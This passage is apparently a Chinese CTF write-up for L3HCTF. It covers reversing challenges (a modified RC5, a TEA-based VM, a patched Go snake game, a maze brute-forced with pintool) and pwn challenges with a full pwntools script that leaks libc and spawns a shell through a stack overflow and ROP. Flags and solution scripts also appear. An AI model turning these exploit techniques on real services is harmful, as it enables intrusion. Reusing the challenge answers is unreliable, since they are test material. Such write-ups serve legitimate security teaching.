+以及两个混淆比较厉害的加密函数（分析可知是rc5加密），可以借助ida9自带的goomba插件解除部分混淆，右键
+
+De-obfuscate即可，但是得到的函数依然存在很多逻辑混淆
+
+比如恒真恒假跳转
+
+```Python
+if ( unk_B1C8 < 10 && unk_B1C8 >= 10 )    // 恒假
+    goto LABEL_26;
+if ( unk_B218 >= 10 || unk_B218 < 10 )    // 恒真
+      break;
+```
+
+减1
+
+```Python
+*v37 - 1067854539 + 1067854538    // 等价于*v37 - 1
+```
+
+异或
+
+```Python
+*v24 & 0xAE4094B7 | ~*v24 & 0x51BF6B48    // 等价于*v24^0x51BF6B48
+```
+
+偶数次异或相同值不变
+
+```Python
+(*v24 & 0xAE4094B7 | ~*v24 & 0x51BF6B48) ^ (*v23 & 0xAE4094B7 | ~*v23 & 0x51BF6B48)    // 等价于*v24^*v23
+```
+
+或
+
+```C
+v9 ^ v8 | v9 & v8    // 等价于v9|v8
+```
+
+最后可以得到两份干净简洁的伪代码交给gemini分析下
+
+```C++
+__int64 __fastcall sub_555555555250(__int64 a1, __int64 a2)
+{
+  // [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND]
+
+  v41 = a1;
+  v42 = a2;
+        v2 = HIDWORD(v42);
+        v32 = &v27 - 2;
+        v33 = &v27 - 2;
+        v34 = &v27 - 2;
+        v35 = &v27 - 2;
+        v36 = &v27 - 2;
+        v37 = &v27 - 2;
+        v38 = &v27 - 2;
+        v39 = &v27 - 2;
+        v40 = &v27 - 2;
+        *(&v27 - 2) = v41;
+        HIDWORD(v27) = v2;
+        LODWORD(v27) = 0;
+LABEL_3:
+  v31 = *v37 < 4u;
+  if ( v31 )
+  {
+    v3 = v38;
+    *(v34 + *v37) = 0;
+    *v3 = 0;
+    while ( 1 )
+    {
+      if ( *v38 >= 4u )
+      {
+        ++*v37;
+        goto LABEL_3;
+      }
+      *(v34 + *v37) = *(*v33 + (*v38 + 4 * *v37)) + (*(v34 + *v37) << 8);
+      ++*v38;
+    }
+  }
+  v4 = v37;
+  **v32 = 0xB7E15163;
+  *v4 = 1;
+  while ( 1 )
+  {
+    if ( *v37 >= 0x1Au )
+      break;
+    *(*v32 + 4LL * *v37) = *(*v32 + 4LL * (*v37 - 1)) - 0x61C88647;
+    ++*v37;
+  }
+  v7 = v35;
+  v8 = v36;
+  v9 = v37;
+  *v38 = 0;
+  *v9 = 0;
+  *v8 = 0;
+  *v7 = 0;
+  *v39 = 0;
+  while ( 2 )
+  {
+    if ( *v39 < 78 )
+    {
+      v10 = v38;
+      v11 = v36;
+      v12 = v34;
+      v13 = v35;
+      v15 = ((*v35 + *(*v32 + 4LL * *v37) + *v36) >> 29) | ((*v35 + *(*v32 + 4LL * *v37) + *v36) << 3);
+      *(*v32 + 4LL * *v37) = v15;
+      *v13 = v15;
+      v18 = v37;
+      v19 = ((*v11 + *v35 + *(v12 + *v10)) >> ((*v11 + *v35) + 32)) | ((*v13 + *(v12 + *v10) + *v11) << (*v13 + *v11));
+      *(v12 + *v10) = v19;
+      *v11 = v19;
+      v20 = v38;
+      *v18 = (*v18 + 1) % 0x1A;
+      *v20 = (*v20 + 1) & 3;
+      ++*v39;
+    }
+    break;
+  }
+  result = 1;
+  return result;
+}
+int *__fastcall sub_555555555E80(_DWORD *a1, __int64 a2, _DWORD *a3)
+{
+  // [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND]
+
+  v26 = a1;
+  v27 = a2;
+  v28 = a3;
+    v3 = v28;
+    v22 = &v21 - 2;
+    v23 = (&v21 - 2);
+    v24 = &v21 - 2;
+    v25 = &v21 - 2;
+    *(&v21 - 2) = v26;
+    v21 = v3;
+    LODWORD(v21) = **(&v21 - 2) + *v3;
+    *(&v21 - 4) = (*(&v21 - 2))[1] + v21[1];
+    *(&v21 - 4) = 1;
+  while ( *v25 <= 0xCu )
+  {
+      *v23 = *(*v21 + 4LL * (2 * *v25)) + (((*v24 ^ *v23) << *v24) | ((*v24 ^ *v23) >> (32 - *v24)));
+      *v24 = (((*v23 ^ *v24) >> (32 - *v23)) | ((*v23 ^ *v24) << *v23)) + *(*v21 + 4LL * (2 * *v25 + 1));
+      *v23 = *v24 ^ *v23;
+    ++*v25;
+  }
+  v11 = v22;
+  v12 = v24;
+  **v22 = *v23;
+  result = *v11;
+  result[1] = *v12;
+  return result;
+}
+```
+
+分析可知是RC5的密钥扩展和加密函数，其中加密函数地方做了魔改，对在轮加密种A多异或了B，解密脚本如下
+
+还有个很坑的点卡了很久，密钥是`cleWtemoH3Lo!FTC`，而不是 WelcometoL3HCTF! ，正好是后者小端存储形式的字符串（需要动调去密钥扩展里看从内存里读取的到底是什么值）
+
+```Python
+import struct
+
+
+class RC5:
+    def __init__(self, key: bytes):
+        self.w = 32  # 字长（比特）
+        self.r = 12  # 轮数
+        self.b = len(key)  # 密钥长度
+        self.t = 2 * (self.r + 1)  # 密钥表大小
+        self.mod = 1 << self.w  # 模数
+        self.S = self._expand_key(key)
+
+    def _expand_key(self, key: bytes) -> list:
+        # 初始化常量
+        P, Q = 0xB7E15163, 0x61C88647
+
+        # 初始化密钥表
+        S = [P]
+        for i in range(1, self.t):
+            S.append((S[i - 1] - Q) % self.mod)
+
+        # 将密钥转换为字列表
+        c = max(len(key) // 4, 1)
+        L = [0] * c
+        for i in range(len(key)):
+            idx = i // 4
+            shift = 8 * (i % 4)
+            L[idx] = (L[idx] + (key[i] << shift)) % self.mod
+
+        # 混合密钥
+        i = j = 0
+        A = B = 0
+        for _ in range(3 * max(self.t, c)):
+            A = S[i] = self.rotl((S[i] + A + B) % self.mod, 3)
+            B = L[j] = self.rotl((L[j] + A + B) % self.mod, (A + B) % self.w)
+            i = (i + 1) % self.t
+            j = (j + 1) % c
+
+        return S
+
+    def rotl(self, x: int, n: int) -> int:
+        n %= self.w
+        return ((x << n) | (x >> (self.w - n))) % self.mod
+
+    def rotr(self, x: int, n: int) -> int:
+        n %= self.w
+        return ((x >> n) | (x << (self.w - n))) % self.mod
+
+    def decrypt_block(self, data: bytes) -> bytes:
+        # 解析输入块
+        A = struct.unpack('<I', data[:4])[0]
+        B = struct.unpack('<I', data[4:8])[0]
+
+        # 解密过程
+        for i in range(self.r, 0, -1):
+            A = A ^ B
+            B = self.rotr((B - self.S[2 * i + 1]) % self.mod, A) ^ A
+            A = self.rotr((A - self.S[2 * i]) % self.mod, B) ^ B
+
+        B = (B - self.S[1]) % self.mod
+        A = (A - self.S[0]) % self.mod
+
+        # 打包输出
+        return struct.pack('<II', A, B)
+
+    def encrypt_block(self, data: bytes) -> bytes:
+        """加密一个64位数据块"""
+        A = struct.unpack('<I', data[:4])[0]
+        B = struct.unpack('<I', data[4:8])[0]
+
+        # 初始白化
+        A = (A + self.S[0]) % self.mod
+        B = (B + self.S[1]) % self.mod
+
+        # 轮函数
+        for i in range(1, self.r + 1):
+            A = (self.rotl((A ^ B), B) + self.S[2 * i]) % self.mod
+            B = (self.rotl((B ^ A), A) + self.S[2 * i + 1]) % self.mod
+            A ^= B
+
+        return struct.pack('<II', A, B)
+
+    def encrypt(self, plaintext: bytes) -> bytes:
+        """加密任意长度数据"""
+        # 分块加密
+        blocks = [plaintext[i:i+8] for i in range(0, len(plaintext), 8)]
+        ciphertext = b''
+        for block in blocks:
+            ciphertext += self.encrypt_block(block)
+        return ciphertext
+
+    def decrypt(self, ciphertext: bytes) -> bytes:
+        # 处理填充（示例使用PKCS#7）
+        blocks = [ciphertext[i:i + 8] for i in range(0, len(ciphertext), 8)]
+        plaintext = b''
+        for block in blocks:
+            plaintext += self.decrypt_block(block)
+        return plaintext
+
+
+if __name__ == "__main__":
+    key = b"cleWtemoH3Lo!FTC"
+    rc5 = RC5(key)
+    plainttext = b"flag{11111222222333333333333334}"
+    ciphertext = rc5.encrypt(plainttext)
+    print(ciphertext.hex())
+    ciphertext = bytes([0x1B, 0xBB, 0xA1, 0xF2, 0xE9, 0x7C, 0x87, 0x21, 0x8A, 0x37, 0xFD, 0x0A, 0x94, 0x1A, 0x81, 0xBC, 0x40, 0x1E, 0xE3, 0xAA, 0x73, 0x2E, 0xD8, 0x3F, 0x84, 0xB8, 0x71, 0x42, 0xCC, 0x35, 0x8B, 0x39])
+
+    plaintext = rc5.decrypt(ciphertext)
+    print(f"Decrypted: {plaintext}")
+```
+
+## easyvm
+
+调试可以发现是类tea加密，8字节一组变化
+
+最开始做复杂了一点点去分析VM里每个指令的作用并试图模拟，最后才想到直接ida下条件断点在重要运算指令上即可，把两个操作数打印下就知道每一步计算都做了什么
+
+找到vm计算指令的位置（tea中主要为add、sub、xor、shl、shr），简单写下idapython脚本，以此来模拟trace获得加密log
+
+![img](bb28e8da-4dc7-47cf-8b32-8592c4b3a480.png)
+
+```Python
+import idc, idaapi
+op1_val = idc.get_reg_value("EDX")
+op2_val = idc.get_reg_value("ECX") & 0xFF
+result_val = idc.get_reg_value("EDX")
+print(f"shl {hex(op1_val)}, {hex(op2_val)} = {hex((op1_val<<op2_val)&0xffffffff)}")
+
+import idc, idaapi
+op1_val = idc.get_reg_value("EDX")
+op2_val = idc.get_reg_value("ECX") & 0xFF
+print(f"shr {hex(op1_val)}, {hex(op2_val)} = {hex((op1_val>>op2_val)&0xffffffff)}")
+
+import idc, idaapi
+op1_val = idc.get_reg_value("EAX")
+rbp_val = idc.get_reg_value("RBP")
+mem_addr = rbp_val + 0x4C
+op2_val = idc.get_wide_dword(mem_addr)
+print(f"xor {hex(op1_val)}, {hex(op2_val)} = {hex((op1_val^op2_val)&0xffffffff)}")
+
+import idc, idaapi
+op1_val = idc.get_reg_value("EAX")
+rbp_val = idc.get_reg_value("RBP")
+mem_addr = rbp_val + 0x1C
+op2_val = idc.get_wide_dword(mem_addr)
+print(f"sub {hex(op1_val)}, {hex(op2_val)} = {hex((op1_val-op2_val)&0xffffffff)}")
+
+import idc, idaapi
+op1_val = idc.get_reg_value("EAX")
+op2_val = idc.get_reg_value("EDX")
+print(f"add {hex(op1_val)}, {hex(op2_val)} = {hex((op1_val+op2_val)&0xffffffff)}")  
+```
+
+log取一轮加密来分析
+
+```SQL
+shl 0x32323232, 0x3 = 0x91919190
+add 0xa56babcd, 0x91919190 = 0x36fd3d5d
+add 0x0, 0x32323232 = 0x32323232
+add 0x0, 0x32323232 = 0x32323232
+xor 0x32323232, 0x36fd3d5d = 0x4cf0f6f
+shr 0x32323232, 0x4 = 0x3232323
+add 0xffffffff, 0x3232323 = 0x3232322
+xor 0x4cf0f6f, 0x3232322 = 0x7ec2c4d
+add 0x31313131, 0x7ec2c4d = 0x391d5d7e
+add 0x11223344, 0x0 = 0x11223344
+shl 0x391d5d7e, 0x2 = 0xe47575f8
+add 0xffffffff, 0xe47575f8 = 0xe47575f7
+add 0x11223344, 0x391d5d7e = 0x4a3f90c2
+add 0xabcdef01, 0x4a3f90c2 = 0xf60d7fc3
+xor 0xf60d7fc3, 0xe47575f7 = 0x12780a34
+shr 0x391d5d7e, 0x5 = 0x1c8eaeb
+add 0xa56babcd, 0x1c8eaeb = 0xa73496b8
+xor 0x12780a34, 0xa73496b8 = 0xb54c9c8c
+add 0x32323232, 0xb54c9c8c = 0xe77ecebe
+sub 0x40, 0x1 = 0x3f
+```
+
+可以看到三个密钥0xa56babcd、0xffffffff、0xabcdef01以及delta=0x11223344
+
+往后分析看所有轮加密完total做了什么，可以发现下一组加密8字节用的total值是上一组结束后的total值
+
+```SQL
+add 0x11223344, 0x488cd100 = 0x59af0444    // 上一组total
+shl 0x6bc23e4e, 0x2 = 0xaf08f938
+add 0xffffffff, 0xaf08f938 = 0xaf08f937
+add 0x59af0444, 0x6bc23e4e = 0xc5714292
+add 0xabcdef01, 0xc5714292 = 0x713f3193
+xor 0x713f3193, 0xaf08f937 = 0xde37c8a4
+shr 0x6bc23e4e, 0x5 = 0x35e11f2
+add 0xa56babcd, 0x35e11f2 = 0xa8c9bdbf
+xor 0xde37c8a4, 0xa8c9bdbf = 0x76fe751b
+add 0x34343434, 0x76fe751b = 0xab32a94f
+sub 0x40, 0x1 = 0x3f
+shl 0xab32a94f, 0x3 = 0x59954a78
+add 0xa56babcd, 0x59954a78 = 0xff00f645
+add 0x59af0444, 0xab32a94f = 0x4e1ad93
+add 0x0, 0x4e1ad93 = 0x4e1ad93
+xor 0x4e1ad93, 0xff00f645 = 0xfbe15bd6
+shr 0xab32a94f, 0x4 = 0xab32a94
+add 0xffffffff, 0xab32a94 = 0xab32a93
+xor 0xfbe15bd6, 0xab32a93 = 0xf1527145
+add 0x6bc23e4e, 0xf1527145 = 0x5d14af93
+add 0x11223344, 0x59af0444 = 0x6ad13788    // 新一组total
+```
+
+搞懂加密逻辑直接开逆
+
+```Python
+from ctypes import c_uint32
+
+
+def tea_encrypt(r, v, key, delta):
+    v0, v1 = c_uint32(v[0]), c_uint32(v[1])
+    total = c_uint32(0)
+    for i in range(r):
+        v0.value += ((v1.value << 3) + key[0]) ^ (v1.value + total.value) ^ ((v1.value >> 4) + key[1])
+        total.value += delta
+        v1.value += ((v0.value << 2) + key[1]) ^ (v0.value + total.value + key[2]) ^ ((v0.value >> 5) + key[0])
+    return v0.value, v1.value
+
+
+def tea_decrypt(r, v, key, delta, id):
+    v0, v1 = c_uint32(v[0]), c_uint32(v[1])
+    total = c_uint32(delta * r * (id//2+1))
+    for i in range(r):
+        v1.value -= ((v0.value << 2) + key[1]) ^ (v0.value + total.value + key[2]) ^ ((v0.value >> 5) + key[0])
+        total.value -= delta
+        v0.value -= ((v1.value << 3) + key[0]) ^ (v1.value + total.value) ^ ((v1.value >> 4) + key[1])
+    return v0.value, v1.value
+
+v = [2272944806, 1784017395, 2920892487, 2984657895, 2840586369, 2613617290, 3301943967, 4053798049]
+k = [0xa56babcd, 0xffffffff, 0xabcdef01]
+delta = 0x11223344
+for i in range(0, len(v), 2):
+    v[i:i+2] = tea_decrypt(64, v[i:i+2], k, delta, i)
+print(list(map(hex, v)))
+v = "".join([int.to_bytes(v[i], byteorder='little', length=4).decode() for i in range(len(v))])
+print(v)
+```
+
+得到9c50d10ba864bedfb37d7efa4e110bf2
+
+## snake
+
+无符号的go实现的贪吃蛇游戏，直接读逻辑十分困难，然后有反调试，无法正常进行调试
+
+搜索得到原游戏项目：https://github.com/stable-online/golang_snake?tab=readme-ov-file
+
+Git clone一份源码然后编译出snake.exe，然后尝试bindiff恢复符号表，效果并不是很好，但是可以作为一个参考的依据。
+
+寻找定位到得分判断逻辑
+
+![img](5812720d-b529-4f96-aafe-7e0d8cbe1886.png)
+
+发现是得分要到100，但是尝试修改得分要求后程序会卡住，往下理逻辑找到了一个xxtea解密的实现
+
+![img](b7c5cc65-9a4c-4cb4-bd57-62043378d1d0.png)
+
+分析之间的层次关系发现分数的改变对于xxtea的密钥会产生影响，那么思路想到去寻找得分的逻辑
+
+利用编译好的原游戏文件辅助定位找到了move逻辑，其中有rc4生成随机的金币位置
+
+![img](98825187-3d59-41fd-868c-d4f0302bfbfb.png)
+
+寻找到加分的逻辑
+
+![img](37f4d4a8-4137-41c3-9f7e-9e267ccf77f8.png)
+
+现在有条件限制吃到金币之后可以得分，那么我们把这个限制条件nop取消，就可以实现随时间增加自动加分
+
+![img](51398f3e-a91b-4a54-9d51-cfab38c5262b.png)
+
+nop掉这里的cmp逻辑即可，然后重新运行程序得到flag（会随机触发不稳定的反调试，多跑几次即可）
+
+![img](d816f7ca-643c-4f63-b6cb-8ed52f2484d4.png)
+
+L3HCTF{ad4d5916-9697-4219-af06-014959c2f4c9}
+
+## AWayOut2
+
+ida反编译根本看不懂只在后面爆破的时候拐回来才看到有个hjkl的判断，很明显迷宫四个方向键
+
+由于太难分析控制流因此我用pintool进行爆破，观察到输入结果和对应指令数如下
+
+```C
+a 419744191
+
+k 419730508
+h 419730512
+j 419730514
+l 419744180 # x
+
+la 640207084
+lk 640193401
+ll 640207073 # x
+lj 640193407
+
+lla 860727831
+llk 860714148
+lll 860714144
+llj 860727830 # x
+```
+
+可以发现输入正确的指令数会和输入不是hjkl指令数相差较小，而其他的指令数绝对值差都大于1000，因此可以逐位进行爆破，使用DFS遍历所有可能
+
+由于输入后返回结果时间较长，不使用多线程爆破时间太长了，因此我写了份基本单线程脚本
+
+```Python
+import os
+import collections
+import time
+from pwn import *
+
+# --- 配置 ---
+context.log_level = 'error'
+PIN_COMMAND = ["./pin", "-t", "inscount0.so", "--", "./AWayOut2"]
+# 字符集顺序现在变得更重要。将常见字符放在前面可能会提高效率。
+CHARSET = "{hjkl"
+FLAG_LENGTH = 118
+ANOMALY_THRESHOLD = 9000  # 显著差异的阈值，可以微调
+
+
+# --- 辅助函数 (与之前相同) ---
+
+def get_instruction_count(test_flag):
+    """
+    运行 PIN 工具并获取给定 flag 的指令数。
+    """
+    try:
+        p = process(PIN_COMMAND)
+        p.recvuntil(b'try:\n', timeout=5)
+        p.sendline(test_flag.encode())
+        output = p.recvall(timeout=20)
+        p.close()
+
+        lines = output.strip().splitlines()
+        if lines and lines[-1].isdigit():
+            return int(lines[-1])
+        else:
+            return -1
+    except Exception as e:
+        return -1
+
+
+# --- 新的主逻辑 (激进 DFS) ---
+
+def solve_aggressive_dfs(known_prefix=""):
+    """
+    使用激进的深度优先搜索策略。
+    一旦发现一个字符比当前层级已知的最小指令数显著更低，就立即深入。
+    """
+    # 基本情况：如果长度达到目标，说明成功了
+    if len(known_prefix) == FLAG_LENGTH:
+        print("\n" + "=" * 60)
+        print(f"[*] 成功！找到完整 Flag: {known_prefix}")
+        print("=" * 60)
+        return True
+
+    current_pos = len(known_prefix)
+    print(f"\n[+] 正在爆破第 {current_pos + 1} 位字符 (前缀: '{known_prefix}')...")
+
+    # 用于存储当前层级已知的最小指令数
+    min_count_for_this_level = 1000000
+
+    total_chars = len(CHARSET)
+    for i, char in enumerate(CHARSET):
+        test_flag = known_prefix + char
+        progress_text = f"    -> 进度: {i + 1}/{total_chars} | 测试: '{test_flag}'"
+        print(progress_text, end=' ')
+
+        count = get_instruction_count(test_flag)
+        print(count)
+        if count == -1:
+            continue  # 跳过执行失败的尝试
+        if i == 0:
+            tmp = count
+            continue
+        # 核心逻辑：检查当前字符的指令数是否比“已知最小”还要显著降低
+        # ANOMALY_THRESHOLD 是你说的 "10000左右"
+        if abs(tmp - count) > ANOMALY_THRESHOLD:
+            # continue
+            print(f"\n    [*] 发现显著更优字符 '{char}'...")
+            print(f"    [*] 立即深入 DFS 搜索 '{test_flag}'...")
+
+            # 立即递归，不再测试当前层级的其他字符
+            if solve_aggressive_dfs(test_flag):
+                return True  # 如果这条路成功了，直接返回 True
+            else:
+                # 如果深入后发现是死胡同，打印回溯信息并继续在当前层级搜索
+                print(f"\n[!] 路径 '{test_flag}' 是死胡同, 回溯到第 {current_pos + 1} 位, 继续搜索...")
+                # 即使是死胡同，这个 count 也是一个新的有效最小值，需要更新
+                min_count_for_this_level = count
+
+        # 如果不是显著降低，就只更新当前层级的最小指令数
+        elif count < min_count_for_this_level:
+            min_count_for_this_level = count
+
+    # 如果遍历完所有字符都没有找到一条成功的路径，则说明当前前缀是错误的
+    print(f"\n[-] 在位置 {current_pos + 1} 处所有尝试均失败。回溯...")
+    return False
+
+
+# --- 程序入口 ---
+if __name__ == "__main__":
+    print("=" * 60)
+    print("开始使用“激进”DFS 策略进行全长度 Flag 爆破")
+    print("=" * 60)
+
+    # 假设 'h' 仍然是正确的第一个字符
+    if not solve_aggressive_dfs(""):
+        # 如果不确定第一个字符，使用下面这行：
+        # if not solve_aggressive_dfs(""):
+        print("\n" + "=" * 60)
+        print("[!] 未能找到完整的 Flag。")
+        print("=" * 60)
+```
+
+上面的是最基础的脚本，后面多线程发现了更多bug
+
+- 要限制方向，不能跑反方向，比如你之前向右走了你下一步不能再向左了，中午跑的时候还没发现，下午才发现结果里不停的jkjkjk
+- timeout加得大大的，越往后越慢，出现了好几次获取指令数为-1，直接把我dfs搞乱了，跑了一下午才发现出错了，赶紧把跑出来的路径打印出来，果然出现了一些很不合理的路径如下，还好前面的都没问题不至于再从头开始跑
+
+![img](288ea616-82c6-470a-9528-e9670fd33236.png)
+
+- threshold指令差值应该看绝对值，最开始爆破时候没发现l方向完指令数增大，导致做差出现负数，所以一直没有l方向
+- 要有一个错误基准，因此设置了一个{输入，后续输入4个方向和输入{指令数进行比较，绝对值差在1000以内是可以走的方向
+
+爆破脚本如下，借助了pwntool实现了自动化爆破
+
+```Python
+#!/usr/bin/env python3
+import os
+from pwn import *
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+# --- 配置 ---
+PIN_COMMAND = ["./pin", "-t", "inscount0.so", "--", "./AWayOut2"]
+# 字符集顺序现在变得更重要。将常见字符放在前面可能会提高效率。
+CHARSET = "jkhl{"
+FLAG_LENGTH = 118
+MAX_THREADS = 16
+# --- 辅助函数 (与之前相同) ---
+
+def get_instruction_count(test_flag):
+    """
+    运行 PIN 工具并获取给定 flag 的指令数。
+    """
+    try:
+        p = process(PIN_COMMAND)
+        p.recvline(timeout=200)
+        p.sendline(test_flag.encode())
+        output = p.recvall(timeout=200)
+        p.close()
+        
+        lines = output.strip().splitlines()
+        if lines and lines[-1].isdigit():
+            return int(lines[-1])
+        else:
+            return -1
+    except Exception as e:
+        return -1
+
+# --- 新的主逻辑 (激进 DFS) ---
+
+def solve_aggressive_dfs(known_prefix=""):
+    """
+    使用激进的深度优先搜索策略。
+    一旦发现一个字符比当前层级已知的最小指令数显著更低，就立即深入。
+    """
+    # 基本情况：如果长度达到目标，说明成功了
+    if len(known_prefix) == FLAG_LENGTH:
+        print("\n" + "="*60)
+        print(f"[*] 成功！找到完整 Flag: {known_prefix}")
+        print("="*60)
+        return True
+
+    current_pos = len(known_prefix)
+    print(f"\n[+] 正在爆破第 {current_pos + 1} 位字符 (前缀: '{known_prefix}')...")
+
+    # 1. 获取基准字符 '{' 的指令数 (此步骤仍然串行)
+    print(f"    -> 获取基准指令数 (字符: '{{')...", end='')
+    ref_flag = known_prefix + "{"
+    ref_count = get_instruction_count(ref_flag)
+    print(f" 指令数: {ref_count}")
+    
+    # 2. 准备所有要并行测试的任务
+    if known_prefix:
+        if known_prefix[-1] == "l":
+            chars_to_test = ["l", "j", "k"]
+        elif known_prefix[-1] == "h":
+            chars_to_test = ["h", "j", "k"]
+        elif known_prefix[-1] == "j":
+            chars_to_test = ["l", "j", "h"]
+        elif known_prefix[-1] == "k":
+            chars_to_test = ["l", "h", "k"]
+    else:   
+        chars_to_test = ["h", "l", "j", "k"]
+    flags_to_test = [known_prefix + char for char in chars_to_test]
+    
+    candidates = []
+
+    # 3. 使用线程池并行爆破所有字符
+    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
+        # executor.map 会将 get_instruction_count 函数应用到 flags_to_test 中的每一项
+        # 它会按顺序返回结果，这非常方便
+        all_counts = executor.map(get_instruction_count, flags_to_test)
+
+        # 4. 收集并处理结果
+        print("    -> 所有并行任务已完成，正在分析结果...")
+        for char, count in zip(chars_to_test, all_counts):
+            if count != -1:
+                diff = abs(ref_count - count)
+                print(f"{known_prefix+char} (指令数: {count}, 差值: {diff})")
+                if diff < 1000:
+                    candidates.append((char, count))
+
+    # 对所有候选路径并行发起 DFS 递归
+    if candidates:
+        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
+            # 提交所有递归任务
+            futures = [executor.submit(solve_aggressive_dfs, known_prefix + char) for char, _ in candidates]
+            # 等待第一个成功返回的结果
+            for future in as_completed(futures):
+                if future.result(): # 如果某个子任务返回 True
+                    return True # 立刻将成功信号向上传递
+
+    # 如果遍历完所有字符都没有找到一条成功的路径，则说明当前前缀是错误的
+    print(f"\n[-] 在位置 {current_pos + 1} 处所有尝试均失败。回溯...")
+    return False
+
+# --- 程序入口 ---
+if __name__ == "__main__":
+    context.log_level = 'error'
+
+    print("="*60)
+    print("开始使用“激进”DFS 策略进行全长度 Flag 爆破")
+    print("="*60)
+    
+    if not solve_aggressive_dfs("lljjljjhhjjjjjllkkkllljjlljjjhhhhhhjjjjjlljjhhhjjjjlllkklllllkkkllkkkklkllllljjjlllllklllllljjjhhhjjjl"):
+        print("\n" + "="*60)
+        print("[!] 未能找到完整的 Flag。")
+        print("="*60)
+```
+
+跑到最后基本就看出来路径没问题了
+
+![img](d177101f-3d17-4d53-9632-214263c460a8.png)
+
+正确路径为lljjljjhhjjjjjllkkkllljjlljjjhhhhhhjjjjjlljjhhhjjjjlllkklllllkkkllkkkklkllllljjjlllllklllllljjjhhhjjjljjllljjhhjjljjlj
+
+md5后即为flag
+
+# Pwn
+
+## Heack
+
+漏洞在 fight_dragon 有个明显的stack溢出，可以通过修改 v3 来如果 canary,然后修改返回地址
+
+![img](07e49080-a9a6-4610-a379-67b43ef2f18b.png)
+
+fight_dragon  返回时 rsi 是一个libc 地址 ，1/16 概率 把返回地址改到这里，可以直接泄露 libc,
+
+![img](07094fcd-700d-482b-88f7-0fe500c2f99f.png)
+
+![img](aa76fbd0-1b5c-466b-a845-c38381792c2d.png)
+
+有了libc 后  再次利用 fight_dragon  栈溢出 写 rop 即可
+
+![img](bb76d5e7-ac4a-4333-9688-3c1494ba32ee.png)
+
+```Python
+from pwn import *
+#from ctypes import CDLL
+#cdl = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
+s    = lambda   x : io.send(x)
+sa   = lambda x,y : io.sendafter(x,y)
+sl   = lambda   x : io.sendline(x)
+sla  = lambda x,y : io.sendlineafter(x,y)
+r    = lambda x   : io.recv(x)
+ru   = lambda x   : io.recvuntil(x)
+rl   = lambda     : io.recvline()
+itr  = lambda     : io.interactive()
+uu32 = lambda x   : u32(x.ljust(4,b'\x00'))
+uu64 = lambda x   : u64(x.ljust(8,b'\x00'))
+ls   = lambda x   : log.success(x)
+lss  = lambda x   : ls('\033[1;31;40m%s -> 0x%x \033[0m' % (x, eval(x)))
+
+attack = '43.138.2.216:9999'.replace(' ',':')
+binary = './vul2'
+
+def start(argv=[], *a, **kw):
+    if args.GDB:return gdb.debug(binary,gdbscript)
+    if args.TAG:return remote(*args.TAG.split(':'))
+    if args.REM:return remote(*attack.split(':'))
+    return process([binary] + argv, *a, **kw)
+
+#context(arch='amd64', log_level = 'debug')
+context(binary = binary, log_level = 'debug',
+terminal='tmux splitw -h -l 170'.split(' '))
+libc = context.binary.libc
+#elf  = ELF(binary)
+#print(context.binary.libs)
+#libc = ELF('./libc.so.6')
+#import socks
+#context.proxy = (socks.SOCKS5, '192.168.31.251', 10808)
+gdbscript = '''
+brva 0x00146F
+brva 0x01817
+#continue
+'''.format(**locals())
+#import os
+#os.systimport os
+#io = remote(*attack.split(':'))
+
+def note_system():
+    ru('> ')
+    sl('5')
+
+def add(idx,size,text):
+    ru('Choose an option: ')
+    sl('1')
+    ru(': ')
+    sl(str(idx))
+    ru(': ')
+    sl(str(size))
+    ru(': ')
+    s(text)
+def rm(idx):
+    ru('Choose an option: ')
+    sl('2')
+    ru(': ')
+    sl(str(idx))
+def show(idx):
+    ru('Choose an option: ')
+    sl('3')
+    ru(': ')
+    sl(str(idx))
+    ru('---\n')
+
+for i in range(100):
+    io = start([])
+    ru('> ')
+    sl('1')
+    ru('shout:')
+    pay = b'A' * 0x103
+    pay += p8(0x17)
+    pay += p16(0xc91A)
+    try:
+        sl(pay)
+        ru('[Attack]: ')
+        libc_base = int(rl()) - 0x204643
+        libc.address = libc_base
+        lss('libc_base')
+        system = libc.sym['system']
+        bin_sh = next(libc.search(b'/bin/sh'))
+        poprdi = next(libc.search(asm('pop rdi;ret')))
+        rop  = p64(poprdi+1)
+        rop += p64(poprdi)
+        rop += p64(bin_sh)
+        rop += p64(system)
+        ru('> ')
+        sl('1')
+        ru('shout:')
+        pay = b'A' * 0x103
+        pay += p8(0x17)
+        pay += rop
+        #gdb.attach(io,gdbscript)
+        sl(pay)
+        io.interactive()
+    except:
+        io.close()
+itr()
+```
+
+## Heack_revenge
+
+fight_dragon 被修复了，但没完全修复，仍然存在 溢出，只不过只能修改返回地址的一个字节
+
+![img](31bdd8d6-7c8a-4c5a-9356-0beeedc18a8c.png)
+
+写个脚本把在 0x18xx 这段里的gadget 都找出来看看，有没有可以利用的 
+
+![img](693c8005-17a5-433c-b432-28caf1e7c6f5.png)
+
+```Python
+from pwn import *
+
+data = 'FF488D05880C00004889C7E8F0F8FFFF8B45F4488B55F864482B1425280000007405E8E9F8FFFFC9C3F30F1EFA554889E54881ECB000000064488B042528000000488945F831C0488D8550FFFFFFBAA8000000BE000000004889C7E8D0F8FFFFC745E8050F2A01C745EC5D0F1F008B55E88B45EC31D08945F08B45F089C6488D053D0C00004889C7B800000000E88EF8FFFF488D05370C00004889C7E85FF8FFFFB800000000E8DF010000B800000000E8CB0200008945F48B45F483F8050F875001000089C0488D148500000000488D051B0D00008B04024898488D150F0D00004801D03EFFE0488B45D84889C7E829FEFFFFBF00000000E893F8FFFF488D05210C0000'
+data = bytes.fromhex(data)
+
+context.arch='amd64'
+for i in range(len(data)):
+    tmp = data[i:i+0x10]
+    print('--------------------')
+    print(hex(i))
+    print(disasm(tmp))
+```
+
+ 有个 pop rbp
+
+![img](d77fb7fe-c1e2-4de5-808c-5fe34a69a30a.png)
+
+恰好下面就是 heap地址，后继续运行程序并没有出错
+
+![img](0d441f67-7f39-4616-8f27-a5d96d9713d0.png)
+
+后面执行 note_system 可以看到  note_list[] 也在堆上了
+
+![img](9bc8087e-e4a6-4361-a60e-0b15de4b2c6c.png)
+
+ 需要在heap 上提前布局，然后泄露 heap 地址， game 函数 return 时 rsp 也在 heap 上（后面再堆风水，修改stack 进行rop）
+
+![img](55d7f1b7-5096-42cb-ba13-a1ad0fd127ef.png)
+
+```Python
+from pwn import *
+#from ctypes import CDLL
